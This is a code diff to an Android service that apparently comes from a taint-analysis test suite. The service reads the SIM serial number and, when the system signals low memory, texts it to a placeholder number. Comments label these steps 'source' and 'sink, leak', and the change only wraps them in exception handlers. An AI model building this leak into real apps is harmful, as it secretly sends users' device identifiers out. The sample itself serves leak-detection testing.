@@ -23,8 +23,11 @@ public class MainService extends Service {
 	
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
-		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-		secret = telephonyManager.getSimSerialNumber(); //source
+		try{
+						TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+						secret = telephonyManager.getSimSerialNumber(); //source	
+						}catch(NullPointerException e){
+						}catch(ClassCastException ignore){}
 		return 0;
 	}
 
@@ -36,8 +39,10 @@ public class MainService extends Service {
 	
 	@Override
 	public void onLowMemory(){
-		SmsManager sms = SmsManager.getDefault();
-        sms.sendTextMessage("+49 1234", null, secret, null, null);   //sink, leak
+		try{
+							SmsManager sms = SmsManager.getDefault();
+       sms.sendTextMessage("+49 1234", null, secret, null, null);   //sink, leak
+					}catch(NullPointerException e){}
   	}
 
 }
